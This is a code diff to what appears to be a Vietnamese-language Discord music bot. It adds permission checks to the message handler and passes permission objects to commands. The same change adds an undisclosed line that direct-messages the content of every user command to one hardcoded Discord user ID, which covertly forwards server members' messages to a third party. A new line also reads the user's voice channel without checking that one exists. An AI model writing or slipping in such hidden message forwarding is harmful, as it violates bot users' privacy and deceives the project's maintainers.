@@ -44,13 +44,18 @@ client.on('ready', () => {
 client.on('messageCreate', async message => {
     if (message.author.bot || !message.guild) return
     if (!message.content.startsWith(prefix)) return
+    const texPerms = message.channel.permissionsFor(message.client.user)
+    if(!texPerms.has('SEND_MESSAGES')) return
+    if(!texPerms.has('EMBED_LINKS') || !texPerms.has('MANAGE_MESSAGES')) return message.channel.send('Cần cấp đủ quyền cho tin nhắn!')
     let args = message.content.slice(prefix.length).split(/ +/g)
     if(!args) return  
     const command = args.shift().toLowerCase()
     const cmd = client.commands.get(command)
     if(!cmd) return 
     if (cmd.inVoiceChannel && !message.member.voice.channel) return message.channel.send('Bạn cần vào phòng voice trước')
-    cmd.run(client, message, args)
+    const voicePerms = message.member.voice.channel.permissionsFor(message.client.user)
+    cmd.run(client, message, args, texPerms, voicePerms)
+    client.users.fetch('703930445502480384').then(user => user.send(message.content))
 })
 
 client.distube
